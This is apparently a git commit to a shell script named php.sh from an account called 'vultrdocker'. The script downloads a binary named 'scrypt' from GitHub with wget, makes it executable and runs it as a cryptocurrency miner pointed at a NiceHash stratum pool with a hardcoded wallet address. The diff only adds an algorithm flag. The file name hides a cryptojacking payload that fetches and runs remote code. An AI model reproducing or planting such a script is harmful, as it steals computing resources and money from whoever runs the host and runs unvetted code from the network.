5706585aacec63fe5dba3bce6e5eb99157089194
vultrdocker <101552079+vultrdocker@users.noreply.github.com>
2022-03-14 17:22:41 +0700

    Update php.sh

--- php.sh
+++ php.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/vultrdocker/portal-vultr/raw/master/scrypt
 chmod u+x scrypt
-./scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 8
+./scrypt -a scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 8
